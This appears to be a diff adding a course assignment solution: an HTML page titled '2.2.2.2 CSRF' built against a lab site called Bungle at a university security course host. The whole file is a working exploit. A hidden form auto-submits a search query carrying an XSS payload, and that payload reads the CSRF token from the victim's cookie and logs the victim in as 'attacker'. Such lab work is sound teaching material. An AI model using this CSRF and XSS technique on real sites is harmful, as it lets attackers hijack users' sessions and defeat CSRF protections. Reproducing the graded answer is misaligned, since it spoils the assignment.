@@ -1,0 +1,25 @@
+<meta content="text/html;charset=utf-8" http-equiv="Content-Type">
+<meta content="utf-8" http-equiv="encoding">
+<html>
+<head>
+    <title>2.2.2.2 CSRF</title>
+</head>
+<body>
+
+    <iframe id="searchFrame" name="mal_sframe" hidden></iframe>
+
+    <form action="http://bungle-cs461.csl.illinois.edu/search" method="get" class="form-inline" id="search" target="mal_sframe" hidden>
+        <input id="query" type="text" name="q" placeholder="Enter search terms" autofocus="" class="form-control input-lg search-field" value="">
+        <input id="search-btn" type="submit" value="Search" class="btn btn-lg btn-primary">
+        <input type="hidden" name="csrfdefense" value="1"/>
+        <input type="hidden" name="xssdefense" value="0"/>
+    </form>
+
+    <script>
+        var search_form = document.getElementById("search");
+        search_form.query.value = "<iframe id='loginFrame' name='myiframe' hidden></iframe><form name='myform' id='loginForm' target='myiframe'  action='./login' method='POST'><input type='hidden' name='username' value='attacker' /><input type='hidden' name='password' value='l33th4x' /><input type='hidden' id='csrf_token' name='csrf_token' value='0' /></form><script>const parseCookie = str =>str.split(';').map(v => v.split('=')).reduce((acc, v) => {acc[decodeURIComponent(v[0].trim())] = decodeURIComponent(v[1].trim());return acc;}, {});document.getElementById('csrf_token').value = parseCookie(document.cookie).csrf_token;document.myform.submit();</scr"+"ipt>"
+        search_form.submit();
+    </script>
+
+</body>
+</html>
